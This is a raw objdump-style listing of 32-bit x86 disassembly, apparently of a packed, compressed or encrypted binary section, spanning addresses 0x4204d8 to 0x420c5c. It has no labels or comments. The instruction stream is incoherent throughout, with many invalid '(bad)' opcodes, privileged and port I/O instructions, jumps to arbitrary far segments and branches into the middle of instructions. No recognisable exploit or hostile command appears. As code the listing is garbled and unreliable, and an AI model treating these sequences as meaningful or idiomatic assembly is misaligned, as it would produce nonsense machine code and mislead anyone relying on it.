  4204d8:	dec    edx
  4204d9:	mov    WORD PTR [ecx-0x46f6eb6b],?
  4204df:	dec    edx
  4204e0:	fwait
  4204e1:	push   eax
  4204e2:	mov    edi,0x63f6e439
  4204e7:	xchg   esp,eax
  4204e8:	fsub   QWORD PTR [edx]
  4204ea:	test   BYTE PTR [edi+0x4e],bl
  4204ed:	mov    al,0x28
  4204ef:	mov    WORD PTR [ebx+0x7ff1c4a3],?
  4204f5:	or     dl,BYTE PTR [ecx]
  4204f7:	imul   ebx,DWORD PTR [esi-0x2bebe885],0xfffffffb
  4204fe:	les    ebx,FWORD PTR [edx+0x13]
  420501:	ins    DWORD PTR es:[edi],dx
  420502:	xor    eax,DWORD PTR [ebx+0x6266c720]
  420508:	jecxz  0x420509
  42050a:	sahf   
  42050b:	and    dh,BYTE PTR [ecx-0x75dcb615]
  420511:	sub    eax,DWORD PTR [ebp-0x49]
  420514:	xchg   ebp,eax
  420515:	cld    
  420516:	jp     0x420537
  420518:	fisttp QWORD PTR [edx+0x40]
  42051b:	push   cs
  42051c:	pop    esp
  42051d:	pushf  
  42051e:	repnz xor cl,BYTE PTR [edx-0x2f]
  420522:	retf   0x5aa8
  420525:	xor    DWORD PTR [ebx],eax
  420527:	mov    ch,0xe1
  420529:	cmp    BYTE PTR [edx+0x43],al
  42052c:	add    esp,edi
  42052e:	xor    al,0x8c
  420530:	jbe    0x42057a
  420532:	add    esi,esi
  420534:	cvtps2pd xmm0,QWORD PTR [esi+0x35b8d9df]
  42053b:	add    al,0xa4
  42053d:	arpl   bx,sp
  42053f:	pop    eax
  420540:	sub    BYTE PTR [esp+eiz*8],dl
  420543:	inc    ebx
  420544:	cli    
  420545:	mov    cl,0xdb
  420547:	fs ja  0x420517
  42054a:	mov    cl,BYTE PTR [ecx-0x48]
  42054d:	add    edx,ebp
  42054f:	push   ebp
  420550:	jno    0x4205a0
  420552:	xor    eax,ecx
  420554:	inc    edx
  420555:	icebp  
  420556:	loopne 0x4205a7
  420558:	mov    ebp,0x4aa0e7a6
  42055d:	jb     0x420578
  42055f:	dec    ebx
  420560:	sbb    al,0xfa
  420562:	mov    edx,0x114317e3
  420567:	jle    0x420598
  420569:	cmp    bh,ch
  42056b:	sbb    eax,0x9ccb3a9c
  420570:	add    DWORD PTR [edx+edi*4],0x54b7194d
  420577:	sbb    dl,BYTE PTR ds:0xbb17846e
  42057d:	xor    DWORD PTR [eax-0x4412fc86],ecx
  420583:	push   esi
  420584:	inc    edi
  420585:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420586:	data16 and dl,BYTE PTR [esi-0xc5ebc1]
  42058d:	mov    eax,0x4fe17f3f
  420592:	push   ds
  420593:	mov    ebx,0x4cafd77e
  420598:	adc    al,0x1e
  42059a:	enter  0x14fe,0xca
  42059e:	dec    ebx
  42059f:	push   cs
  4205a0:	int    0xe8
  4205a2:	mov    cl,0x4e
  4205a4:	xchg   esi,eax
  4205a5:	das    
  4205a6:	xor    BYTE PTR ds:0x7b3fc9ba,bl
  4205ac:	ror    DWORD PTR ds:0x477a76d,0xb0
  4205b3:	fmulp  st(0),st
  4205b5:	push   0xa96865cb
  4205ba:	cdq    
  4205bb:	inc    esp
  4205bc:	adc    BYTE PTR [esi],cl
  4205be:	jl     0x420542
  4205c0:	or     BYTE PTR [edi],dh
  4205c2:	mov    edx,0xc8acebc3
  4205c7:	cld    
  4205c8:	inc    edi
  4205c9:	aaa    
  4205ca:	rcr    BYTE PTR [esi-0x3f],cl
  4205cd:	outs   dx,DWORD PTR ds:[esi]
  4205ce:	ja     0x4205e3
  4205d0:	dec    ecx
  4205d1:	es jmp 0xd4e5:0xd9ecaf1d
  4205d9:	adc    eax,0xcb383485
  4205de:	jg     0x4205f2
  4205e0:	jg     0x4205a5
  4205e2:	cmp    edi,DWORD PTR [esi]
  4205e4:	mov    cl,0x28
  4205e6:	add    ebx,DWORD PTR [edx-0x2]
  4205e9:	in     al,0xcd
  4205eb:	cwde   
  4205ec:	test   DWORD PTR [edi],edx
  4205ee:	test   DWORD PTR [ebx],edi
  4205f0:	shr    BYTE PTR [edx-0x7a],1
  4205f3:	adc    DWORD PTR [ebx+ebp*2-0x3ad1768b],ecx
  4205fa:	sub    BYTE PTR [edi],cl
  4205fc:	xchg   ebp,eax
  4205fd:	and    DWORD PTR [ebx-0x6],ecx
  420600:	sub    dh,BYTE PTR [edi-0x48]
  420603:	xchg   ebp,eax
  420604:	cdq    
  420605:	(bad)  [esi-0x49]
  420608:	sub    cl,cl
  42060a:	pop    ecx
  42060b:	ficomp WORD PTR [eax+0x76]
  42060e:	adc    dl,BYTE PTR [eax-0x5f42d20e]
  420614:	ins    DWORD PTR es:[edi],dx
  420615:	gs push ds
  420617:	call   edx
  420619:	jmp    0xd3f4b97f
  42061e:	hlt    
  42061f:	in     eax,0xe
  420621:	add    ebp,esp
  420623:	jne    0x4205d6
  420625:	stos   BYTE PTR es:[edi],al
  420626:	pop    esi
  420627:	pop    ecx
  420628:	outs   dx,DWORD PTR ds:[esi]
  420629:	es mov esi,0x1cca7ce8
  42062f:	clc    
  420630:	pop    cx
  420632:	test   al,0x39
  420634:	(bad)  
  420635:	mov    edi,0x40731166
  42063a:	or     esi,DWORD PTR fs:[edx]
  42063d:	xor    DWORD PTR [eax],ebx
  42063f:	push   ebx
  420640:	xor    dl,bh
  420642:	popa   
  420643:	adc    bh,ch
  420645:	ss mov cl,0x2d
  420648:	lds    ebx,FWORD PTR [edi]
  42064a:	retf   
  42064b:	test   edi,0x3e7d28c7
  420651:	mov    dl,0xb5
  420653:	pop    esi
  420654:	pop    ss
  420655:	in     eax,0x62
  420657:	ret    0x24c5
  42065a:	jge    0x420671
  42065c:	fisubr DWORD PTR [ebx+0x66]
  42065f:	dec    ecx
  420660:	cmc    
  420661:	pop    ds
  420662:	jne    0x4206ae
  420664:	ins    DWORD PTR es:[edi],dx
  420665:	sub    BYTE PTR [edx-0x35d5c4b3],cl
  42066b:	jmp    0x581c:0xb423a5d2
  420672:	imul   esi,DWORD PTR [edx],0x2
  420675:	repnz retf 0x4fbd
  420679:	inc    ecx
  42067a:	xor    edi,edx
  42067c:	mov    ch,0xa9
  42067e:	or     al,0xb1
  420680:	dec    esi
  420681:	push   ebx
  420682:	mov    ds:0xc4453852,al
  420687:	mov    ebp,0x462f5104
  42068c:	bound  esi,QWORD PTR [esp+eax*1+0x41]
  420690:	sub    al,0xa4
  420692:	pushf  
  420693:	jmp    0x7d8b6ccc
  420698:	aam    0x71
  42069a:	loope  0x42070b
  42069c:	cmp    eax,0x2723b706
  4206a1:	repz mov dl,0x94
  4206a4:	out    0xb4,eax
  4206a6:	mov    dh,0xd
  4206a8:	daa    
  4206a9:	inc    ebx
  4206aa:	sar    DWORD PTR [ebp-0xbdbbdb1],cl
  4206b0:	daa    
  4206b1:	inc    esp
  4206b2:	inc    ecx
  4206b3:	fwait
  4206b4:	gs popa 
  4206b6:	cmc    
  4206b7:	arpl   WORD PTR [ebp-0x54],cx
  4206ba:	out    0xa4,eax
  4206bc:	inc    edi
  4206bd:	fstp   TBYTE PTR [ecx+0x484a5ac3]
  4206c3:	mov    ebp,0xaf55ae03
  4206c8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4206c9:	xor    al,al
  4206cb:	mov    eax,0xcf3ac066
  4206d0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4206d1:	adc    ecx,eax
  4206d3:	retf   0x8c45
  4206d6:	fsub   DWORD PTR ss:[ebx]
  4206d9:	jge    0x420682
  4206db:	sub    ebp,0x4066fca3
  4206e1:	adc    ch,dl
  4206e3:	jmp    0x7e7a:0x25e7f548
  4206ea:	jno    0x42074e
  4206ec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4206ed:	popf   
  4206ee:	scas   al,BYTE PTR es:[edi]
  4206ef:	xchg   ecx,eax
  4206f0:	lock add ebx,DWORD PTR [ebx+0x584bdce1]
  4206f7:	mov    edi,ebp
  4206f9:	(bad)  
  4206fa:	jecxz  0x4206ad
  4206fc:	xchg   esi,eax
  4206fd:	jmp    0x4206cc
  4206ff:	(bad)  
  420700:	test   BYTE PTR [ecx+0x525d214c],0x42
  420707:	inc    edx
  420708:	jnp    0x420724
  42070a:	stos   DWORD PTR es:[edi],eax
  42070b:	shl    DWORD PTR [eax],1
  42070d:	leave  
  42070e:	sub    ecx,DWORD PTR [edi]
  420710:	mov    bh,BYTE PTR [esi-0x298653d2]
  420716:	inc    ebp
  420717:	xor    BYTE PTR [ebp-0x1340015],dl
  42071d:	jg     0x42073e
  42071f:	jbe    0x420716
  420721:	add    BYTE PTR [edx-0x32e5f9e1],bl
  420727:	test   al,0x69
  420729:	or     eax,0xf11f0fc3
  42072e:	pop    ebx
  42072f:	das    
  420730:	into   
  420731:	xor    ecx,DWORD PTR [esi-0x66]
  420734:	and    al,0x3d
  420736:	(bad)  
  420737:	hlt    
  420738:	or     dl,ah
  42073a:	(bad)  
  42073b:	aad    0x20
  42073d:	repz sub eax,esi
  420740:	pop    esp
  420741:	arpl   WORD PTR [eax-0xd5b7daa],bp
  420747:	adc    BYTE PTR [ebx],0x3c
  42074a:	add    al,0x41
  42074c:	adc    al,0xbc
  42074e:	fild   DWORD PTR [edi-0x57cca1c3]
  420754:	fisttp WORD PTR [edi+0x2f]
  420757:	push   0x3d
  420759:	retf   
  42075a:	popa   
  42075b:	fimul  WORD PTR [edx]
  42075d:	cmp    BYTE PTR [edi-0x58],ah
  420760:	sti    
  420761:	adc    cl,dh
  420763:	jbe    0x420742
  420765:	fisttp DWORD PTR [edi]
  420767:	loop   0x420771
  420769:	loopne 0x4207d8
  42076b:	pop    edx
  42076c:	ja     0x42079f
  42076e:	pop    ebx
  42076f:	fld    DWORD PTR [edx]
  420771:	dec    edi
  420772:	mov    al,0xa6
  420774:	stos   DWORD PTR es:[edi],eax
  420775:	lock (bad) 
  420778:	ret    
  420779:	es stos DWORD PTR es:[edi],eax
  42077b:	add    eax,0xc560952b
  420780:	cmp    eax,0x7b0faef4
  420785:	or     al,0xab
  420787:	sub    DWORD PTR [ebx-0x4b],ecx
  42078a:	fstp   QWORD PTR [ebp+edi*4-0x59]
  42078e:	rcr    cl,cl
  420790:	push   edi
  420791:	jne    0x4207df
  420793:	adc    ebp,DWORD PTR [ecx+0x77]
  420796:	mov    ecx,DWORD PTR [edx-0x17229f70]
  42079c:	daa    
  42079d:	nop
  42079e:	inc    edi
  42079f:	mov    ebp,0x247b9de9
  4207a4:	loopne 0x420776
  4207a6:	pop    edx
  4207a7:	call   0x6cd0:0x66848955
  4207ae:	jne    0x4207be
  4207b0:	mov    eax,0x13ca109
  4207b5:	adc    ah,bh
  4207b7:	mov    bh,0x27
  4207b9:	lds    esi,FWORD PTR ds:0x42718a4
  4207bf:	adc    esi,ebp
  4207c1:	adc    DWORD PTR [esi+0x4b5b486e],ecx
  4207c7:	dec    BYTE PTR [ebp-0x40259c6]
  4207cd:	inc    edx
  4207ce:	mov    bx,0x852
  4207d2:	dec    edx
  4207d3:	mov    eax,0xc2789782
  4207d8:	mov    ds:0x35e41b60,eax
  4207dd:	jg     0x4207b7
  4207df:	ficom  WORD PTR [ecx-0x1b1de9a2]
  4207e5:	and    eax,0xf3c4fdfa
  4207ea:	pop    esp
  4207eb:	ins    DWORD PTR es:[edi],dx
  4207ec:	scas   eax,DWORD PTR es:[edi]
  4207ed:	out    0x66,al
  4207ef:	jne    0x420808
  4207f1:	or     BYTE PTR [ecx],0xa5
  4207f4:	ror    BYTE PTR [eax-0x589c94c9],cl
  4207fa:	addr16 jne 0x42079b
  4207fd:	in     eax,0x69
  4207ff:	push   esi
  420800:	xchg   ebp,eax
  420801:	sbb    DWORD PTR [ecx],ebp
  420803:	xchg   edi,eax
  420804:	repz out 0x61,eax
  420807:	push   ebp
  420808:	lahf   
  420809:	jg     0x420793
  42080b:	push   0xc
  42080d:	xchg   edx,eax
  42080e:	add    DWORD PTR [ebp-0x4358fa45],ebp
  420814:	dec    esp
  420815:	out    0x50,eax
  420817:	sbb    al,0x55
  420819:	push   ebp
  42081a:	stos   DWORD PTR es:[edi],eax
  42081b:	stos   BYTE PTR es:[edi],al
  42081c:	inc    ebp
  42081d:	dec    eax
  42081e:	add    al,0x39
  420821:	(bad)  
  420822:	popf   
  420823:	add    edi,ebx
  420825:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420826:	add    ch,BYTE PTR [ecx-0x626d4a1b]
  42082c:	dec    ebx
  42082d:	cmp    dl,bl
  42082f:	xor    DWORD PTR [ebx+0x5a],eax
  420832:	pusha  
  420833:	xchg   BYTE PTR [edi],cl
  420835:	ins    DWORD PTR es:[edi],dx
  420836:	adc    dl,BYTE PTR [ebx]
  420838:	aad    0x4b
  42083a:	pushf  
  42083b:	cmc    
  42083c:	add    al,0xfa
  42083e:	in     al,0xa9
  420840:	sbb    cl,BYTE PTR ds:0xf89e3f24
  420846:	or     eax,0xaa917d02
  42084b:	jb     0x420875
  42084d:	cmp    DWORD PTR [edi],ecx
  42084f:	rol    ch,cl
  420851:	out    dx,eax
  420852:	aam    0xaf
  420854:	mov    ebx,0x76ffc15f
  420859:	ror    DWORD PTR [esi],1
  42085b:	pop    edi
  42085c:	xchg   si,ax
  42085e:	inc    edx
  42085f:	cmp    edx,DWORD PTR [ebp-0x3c]
  420862:	das    
  420863:	pop    ds
  420864:	pop    ebx
  420865:	push   cs
  420866:	pop    edi
  420867:	sbb    ch,cl
  420869:	rcr    BYTE PTR [eax-0x9],cl
  42086c:	mov    eax,ds:0x583e6795
  420871:	imul   esi,DWORD PTR [edx+0x1b],0x4fe0f2d4
  420878:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420879:	cs push esi
  42087b:	mov    DWORD PTR [edi+0x189f021f],ebp
  420881:	adc    BYTE PTR [edx+esi*2+0x71],ch
  420885:	clc    
  420886:	lods   eax,DWORD PTR ds:[esi]
  420887:	jae    0x4208bc
  420889:	jae    0x420876
  42088b:	mov    dh,0x7f
  42088d:	push   0xffffffe8
  42088f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420890:	cmp    bl,dh
  420892:	mov    eax,0x875e297e
  420897:	push   esp
  420898:	shr    DWORD PTR [esi-0x39fa6b22],1
  42089e:	cwde   
  42089f:	xor    eax,0x6331f75b
  4208a4:	pushf  
  4208a5:	outs   dx,DWORD PTR ds:[esi]
  4208a6:	sbb    DWORD PTR [edx+0x44],ecx
  4208a9:	outs   dx,DWORD PTR ds:[esi]
  4208aa:	pop    ds
  4208ab:	aas    
  4208ac:	shl    DWORD PTR [esi-0x5a67f021],0xb
  4208b3:	inc    ebx
  4208b4:	in     eax,0xf3
  4208b6:	repnz adc edi,DWORD PTR [ebx]
  4208b9:	xchg   esi,eax
  4208ba:	rcr    edx,0xf9
  4208bd:	mov    dl,0xf7
  4208bf:	stos   DWORD PTR es:[edi],eax
  4208c0:	and    esp,DWORD PTR [esp+ecx*4-0xd51dc2e]
  4208c7:	inc    ebp
  4208c8:	pop    edi
  4208c9:	add    eax,DWORD PTR [esi]
  4208cb:	les    edi,FWORD PTR [esi-0x20]
  4208ce:	mov    al,0xa8
  4208d0:	call   0x3e1002ca
  4208d5:	shl    DWORD PTR ds:0x568cedcb,cl
  4208db:	(bad)  
  4208dc:	mov    eax,ds:0x73870968
  4208e1:	or     ebp,DWORD PTR [ebp-0x597f3b2c]
  4208e7:	(bad)  
  4208e8:	sub    al,BYTE PTR [edi+ebp*2]
  4208eb:	mov    eax,ds:0x5e693ca5
  4208f0:	sti    
  4208f1:	retf   0x7f
  4208f4:	mov    esi,eax
  4208f6:	cwde   
  4208f7:	fisubr WORD PTR [edx]
  4208f9:	sub    dh,bh
  4208fb:	xchg   edi,eax
  4208fc:	xor    al,0x10
  4208fe:	mov    eax,0xe14eaf8d
  420903:	scas   al,BYTE PTR es:[edi]
  420904:	inc    ecx
  420905:	mov    al,0xbe
  420907:	push   ebp
  420908:	and    BYTE PTR [esi+0x69],0xab
  42090c:	or     DWORD PTR gs:[ebp+0x75ffe0e0],ecx
  420913:	clc    
  420914:	jp     0x420927
  420916:	int    0x1c
  420918:	xchg   DWORD PTR [edx-0x47],eax
  42091b:	inc    esp
  42091c:	or     DWORD PTR [ebx],ebp
  42091e:	cdq    
  42091f:	jmp    0x420954
  420921:	inc    esi
  420922:	clc    
  420923:	mov    ebx,0x676e9810
  420928:	pushf  
  420929:	and    ch,BYTE PTR [ebp-0x2d]
  42092c:	aam    0x1a
  42092e:	push   ebx
  42092f:	imul   esp,ebx,0xffffffc5
  420932:	jae    0x4209af
  420934:	mov    dl,0x13
  420936:	stos   DWORD PTR es:[edi],eax
  420937:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420938:	pop    esp
  420939:	xor    DWORD PTR [ebx],eax
  42093b:	and    BYTE PTR [ebp-0x2d],al
  42093e:	sub    al,0xa0
  420940:	pop    ds
  420941:	mov    WORD PTR [eax],es
  420943:	mov    eax,0xcc852343
  420948:	pop    edi
  420949:	ds pop esi
  42094b:	push   ebx
  42094c:	shr    BYTE PTR [ebx+0x8],cl
  42094f:	mov    al,0x9f
  420951:	ror    ebp,cl
  420953:	add    al,0xe1
  420955:	pop    esp
  420956:	inc    ecx
  420957:	les    esi,FWORD PTR [edx-0xb]
  42095a:	sbb    edi,DWORD PTR [edi]
  42095c:	pop    ebx
  42095d:	es mov esi,0x6bc4d23a
  420963:	add    cl,BYTE PTR [esi+0x2ccac28a]
  420969:	jle    0x420952
  42096b:	pop    ds
  42096c:	jle    0x420920
  42096e:	(bad)  [eax-0x42fbad2f]
  420974:	aam    0x7a
  420976:	or     eax,0x5fd9d3a9
  42097b:	xor    ch,BYTE PTR [esi+ebp*2-0xf]
  42097f:	inc    esp
  420980:	ds pop edx
  420982:	adc    ecx,DWORD PTR [ecx-0x2484883]
  420988:	add    BYTE PTR [eax+0x3c095cfd],ch
  42098e:	call   0x2923:0xeeff7926
  420995:	(bad)  
  420996:	dec    edx
  420997:	neg    DWORD PTR [edx]
  420999:	jne    0x420942
  42099b:	add    DWORD PTR [ecx],0x8f8ba877
  4209a1:	data16 xchg al,dl
  4209a4:	int3   
  4209a5:	ror    BYTE PTR [eax+0x56028903],cl
  4209ab:	and    DWORD PTR [edi],edi
  4209ad:	addr16 clc 
  4209af:	test   al,0xc5
  4209b1:	push   esi
  4209b2:	loop   0x420a16
  4209b4:	loope  0x4209fa
  4209b6:	sbb    ecx,esp
  4209b8:	test   eax,0x5130262a
  4209bd:	xor    edi,0xf664925b
  4209c3:	mov    edx,0xb790513c
  4209c8:	cmp    edi,DWORD PTR [eax]
  4209ca:	pop    esi
  4209cb:	outs   dx,DWORD PTR ds:[esi]
  4209cc:	and    bh,dl
  4209ce:	mov    esi,0xfc27c64c
  4209d3:	out    dx,al
  4209d4:	add    ecx,DWORD PTR [eax+0x36]
  4209d7:	data16 fistp DWORD PTR [edx+0x221ba6d6]
  4209de:	(bad)  
  4209df:	retf   
  4209e0:	sub    esp,ebp
  4209e2:	fbld   TBYTE PTR [edx+0x453beee3]
  4209e8:	inc    edx
  4209e9:	int3   
  4209ea:	mov    ch,BYTE PTR [eax]
  4209ec:	jo     0x4209c1
  4209ee:	xchg   esi,eax
  4209ef:	repnz push edi
  4209f1:	dec    esi
  4209f2:	jecxz  0x420a3b
  4209f4:	add    al,0x1
  4209f6:	popa   
  4209f7:	pop    es
  4209f8:	inc    ebx
  4209f9:	outs   dx,BYTE PTR ds:[esi]
  4209fa:	mov    edi,0xf87cd424
  4209ff:	lds    esp,FWORD PTR gs:[esi-0x5a]
  420a03:	jbe    0x420a75
  420a05:	in     eax,0x52
  420a07:	gs (bad) 
  420a09:	in     eax,dx
  420a0a:	and    ebp,DWORD PTR [edx]
  420a0c:	sbb    dh,BYTE PTR [edx]
  420a0e:	add    eax,0x79217cfa
  420a13:	pcmpeqw mm4,QWORD PTR [eax+ebx*8+0x32]
  420a18:	imul   eax,ebx,0x73
  420a1b:	cvtdq2ps xmm5,XMMWORD PTR [ecx+0x69]
  420a1f:	inc    ebx
  420a20:	dec    esi
  420a21:	adc    al,0x6d
  420a23:	leave  
  420a24:	jb     0x4209b9
  420a26:	mov    eax,0x295924d8
  420a2b:	iret   
  420a2c:	mov    ebp,0x939577cc
  420a31:	icebp  
  420a32:	adc    al,BYTE PTR [ebx]
  420a34:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420a35:	inc    edi
  420a36:	(bad)  
  420a37:	push   edi
  420a38:	repnz adc DWORD PTR [eax],ebp
  420a3b:	jne    0x4209f0
  420a3d:	mov    edi,0x7a9f417e
  420a42:	neg    DWORD PTR [ebp-0x60b1fff3]
  420a48:	mov    ?,WORD PTR [edx]
  420a4a:	in     al,dx
  420a4b:	mov    DWORD PTR [ecx+0x6a],0x59cbff2c
  420a52:	mov    es,WORD PTR cs:[edi-0x60]
  420a56:	pop    ebx
  420a57:	imul   ecx,DWORD PTR [eax],0x125fc80
  420a5d:	retf   0xd513
  420a60:	loope  0x420a75
  420a62:	cmp    BYTE PTR [ebx-0x66],dl
  420a65:	push   0x1c114aab
  420a6a:	pop    es
  420a6b:	ins    DWORD PTR es:[edi],dx
  420a6c:	pop    ss
  420a6d:	jge    0x420a95
  420a6f:	sub    DWORD PTR [ecx],eax
  420a71:	pop    ebx
  420a72:	icebp  
  420a73:	sub    edx,0xffffff83
  420a76:	aad    0x79
  420a78:	pushf  
  420a79:	fxch   st(4)
  420a7b:	jg     0x420a21
  420a7d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420a7e:	pop    ds
  420a7f:	inc    ebp
  420a80:	test   al,0xd4
  420a82:	sub    eax,0x305a005f
  420a87:	(bad)  ds:0x7a694748
  420a8d:	and    dh,ch
  420a8f:	pop    esi
  420a90:	test   al,0xe4
  420a92:	jmp    0xc848:0x5654594c
  420a99:	js     0x420b18
  420a9b:	fidivr DWORD PTR [ebx+0x35b5e337]
  420aa1:	add    ah,BYTE PTR [ecx-0x6a]
  420aa4:	xor    al,0x65
  420aa6:	cmp    dl,BYTE PTR [eax]
  420aa8:	or     al,0x57
  420aaa:	fsubr  DWORD PTR [eax]
  420aac:	pop    esi
  420aad:	mov    BYTE PTR [edi+0x57],ch
  420ab0:	dec    ebp
  420ab1:	sahf   
  420ab2:	ja     0x420b0d
  420ab4:	push   ebp
  420ab5:	es cli 
  420ab7:	lea    ebx,[eax-0x16]
  420aba:	xchg   ebp,eax
  420abb:	add    eax,0xb7549d1a
  420ac0:	or     al,0x87
  420ac2:	cli    
  420ac3:	xor    DWORD PTR [esi+0x20f1a0d7],eax
  420ac9:	enter  0x2de0,0xf0
  420acd:	and    BYTE PTR [ebp+0x46],ah
  420ad0:	mov    edi,0xb5b24d79
  420ad5:	ins    BYTE PTR es:[edi],dx
  420ad6:	ret    0xaf78
  420ad9:	mov    esi,0xc8e169f6
  420ade:	push   cs
  420adf:	jmp    FWORD PTR [ecx+0x7fcbf11c]
  420ae5:	or     al,0xfa
  420ae7:	rcr    bh,0x16
  420aea:	rol    BYTE PTR [edx],0x48
  420aed:	(bad)  
  420aee:	out    dx,al
  420aef:	dec    edi
  420af0:	enter  0x6017,0xec
  420af4:	cmp    edi,edx
  420af6:	daa    
  420af7:	push   eax
  420af8:	pop    ecx
  420af9:	shr    edx,0x4c
  420afc:	add    DWORD PTR [edi],ecx
  420afe:	ins    BYTE PTR es:[edi],dx
  420aff:	aad    0x7b
  420b01:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420b02:	sub    eax,0xf3d4951d
  420b07:	mov    eax,ds:0x86be0bdd
  420b0c:	into   
  420b0d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420b0e:	nop
  420b0f:	jge    0x420afa
  420b11:	out    dx,al
  420b12:	inc    edx
  420b13:	or     al,0xce
  420b15:	and    DWORD PTR [ebx-0x2],ebx
  420b18:	xor    bh,BYTE PTR [edx+0x2d]
  420b1b:	std    
  420b1c:	out    dx,eax
  420b1d:	je     0x420b28
  420b1f:	enter  0x42f9,0x19
  420b23:	add    BYTE PTR [esp+edx*8-0x19056abc],dh
  420b2a:	(bad)  
  420b2b:	aad    0x30
  420b2d:	sub    cl,BYTE PTR [edi]
  420b2f:	mov    DWORD PTR [esi+0x7a518f46],esi
  420b35:	into   
  420b36:	push   ebp
  420b37:	jne    0x420baa
  420b39:	ins    BYTE PTR es:[edi],dx
  420b3a:	mov    bh,0xfe
  420b3c:	add    ebp,DWORD PTR [ebx]
  420b3e:	pop    es
  420b3f:	inc    esi
  420b40:	sbb    BYTE PTR [edi],0x8e
  420b43:	imul   esi,esp,0x1ebc535e
  420b49:	pushf  
  420b4a:	nop
  420b4b:	inc    esi
  420b4c:	lods   al,BYTE PTR ds:[esi]
  420b4d:	sbb    BYTE PTR [edx-0x39380de3],ah
  420b53:	bound  esp,QWORD PTR [ebp-0x56c3f041]
  420b59:	adc    al,0x8f
  420b5b:	scas   eax,DWORD PTR es:[edi]
  420b5c:	adc    esi,DWORD PTR [esi+0x46ec9ba5]
  420b62:	scas   eax,DWORD PTR es:[edi]
  420b63:	into   
  420b64:	ret    0x4e6
  420b67:	push   edi
  420b68:	out    0x53,eax
  420b6a:	or     cl,bh
  420b6c:	mov    ch,0x6
  420b6e:	cs dec ebx
  420b70:	xchg   esp,eax
  420b71:	daa    
  420b72:	test   BYTE PTR [edi+0x30],al
  420b75:	sti    
  420b76:	daa    
  420b77:	stos   BYTE PTR es:[edi],al
  420b78:	lahf   
  420b79:	dec    edi
  420b7a:	std    
  420b7b:	inc    esi
  420b7c:	and    DWORD PTR [edx],eax
  420b7e:	push   edx
  420b7f:	sbb    cl,bh
  420b81:	or     al,0x1b
  420b83:	and    eax,edx
  420b85:	out    dx,al
  420b86:	mov    DWORD PTR [edx],ebx
  420b88:	xor    al,BYTE PTR ds:0x3b07
  420b8d:	adc    edx,edi
  420b8f:	cmp    al,0xc2
  420b91:	xchg   ebp,eax
  420b92:	jecxz  0x420b54
  420b94:	inc    edi
  420b95:	jmp    0x420bf1
  420b97:	or     al,0x92
  420b99:	xchg   esi,eax
  420b9a:	jle    0x420b55
  420b9c:	pop    eax
  420b9d:	jecxz  0x420b33
  420b9f:	jle    0x420b38
  420ba1:	mov    edx,DWORD PTR [edi+0x29]
  420ba4:	ja     0x420b8c
  420ba6:	cld    
  420ba7:	ins    BYTE PTR es:[edi],dx
  420ba8:	hlt    
  420ba9:	nop
  420baa:	(bad)  
  420bab:	mov    bl,0x6c
  420bad:	jl     0x420ba8
  420baf:	mov    ds:0xb02c522e,eax
  420bb4:	fwait
  420bb5:	rcl    BYTE PTR [ebx],0xe5
  420bb8:	xchg   ebp,eax
  420bb9:	push   esp
  420bba:	lods   eax,DWORD PTR ds:[esi]
  420bbb:	inc    esp
  420bbc:	pop    es
  420bbd:	sti    
  420bbe:	sbb    bl,dl
  420bc0:	inc    esi
  420bc1:	jp     0x420beb
  420bc3:	fcmove st,st(4)
  420bc5:	mov    bl,BYTE PTR [esi-0x70]
  420bc8:	add    dl,BYTE PTR [eax]
  420bca:	xor    eax,0xd7f5e3b
  420bcf:	xlat   BYTE PTR ds:[ebx]
  420bd0:	xchg   edx,eax
  420bd1:	xor    al,0x6b
  420bd3:	adc    esi,ebx
  420bd5:	sbb    bl,ch
  420bd7:	dec    esi
  420bd8:	pop    ss
  420bd9:	cmc    
  420bda:	adc    ah,BYTE PTR [eax-0x15]
  420bdd:	dec    DWORD PTR [edi-0x3462ca1c]
  420be3:	jmp    0x420b89
  420be5:	ss jle 0x420b7c
  420be8:	imul   eax,DWORD PTR [ebp+0x4c],0x65
  420bec:	cmp    eax,DWORD PTR [edx]
  420bee:	shl    BYTE PTR [ecx+0x44],cl
  420bf1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420bf2:	sete   BYTE PTR [eax]
  420bf5:	push   ds
  420bf6:	loopne 0x420b82
  420bf8:	xor    al,0x92
  420bfa:	adc    al,BYTE PTR [esi-0x68b8bbc2]
  420c00:	lds    ecx,FWORD PTR [ecx]
  420c02:	xor    al,0xa0
  420c04:	jmp    0xa2ab786e
  420c09:	inc    DWORD PTR [ecx]
  420c0b:	dec    esp
  420c0c:	xchg   edi,eax
  420c0d:	ins    BYTE PTR es:[edi],dx
  420c0e:	and    DWORD PTR [ebx+ebx*4+0x2af9c995],edi
  420c15:	adc    DWORD PTR [edx+0x7d09495],esp
  420c1b:	fwait
  420c1c:	lods   eax,DWORD PTR ds:[esi]
  420c1d:	xchg   BYTE PTR [ebp-0x3758a35e],ch
  420c23:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420c24:	inc    esp
  420c25:	pop    ebx
  420c26:	mov    BYTE PTR [edx+ecx*2-0x5a],cl
  420c2a:	and    cl,cl
  420c2c:	fimul  WORD PTR [bx-0x5665]
  420c31:	dec    edi
  420c32:	out    0xc,eax
  420c34:	push   esp
  420c35:	push   ebx
  420c36:	cwde   
  420c37:	inc    edx
  420c38:	mov    edx,0x42f5239c
  420c3d:	in     eax,0xad
  420c3f:	shl    eax,cl
  420c41:	dec    ebx
  420c42:	int3   
  420c43:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420c44:	push   0xffffff9f
  420c46:	mov    eax,ds:0x75751552
  420c4b:	jae    0x420c5e
  420c4d:	imul   esp,DWORD PTR [ebp+0xb],0x47
  420c51:	test   DWORD PTR [esi-0x6e],ebp
  420c54:	test   DWORD PTR [edx],ebx
  420c56:	sbb    DWORD PTR [esp],esp
  420c59:	sub    edx,DWORD PTR [edx+0x9]
  420c5c:	pushf  
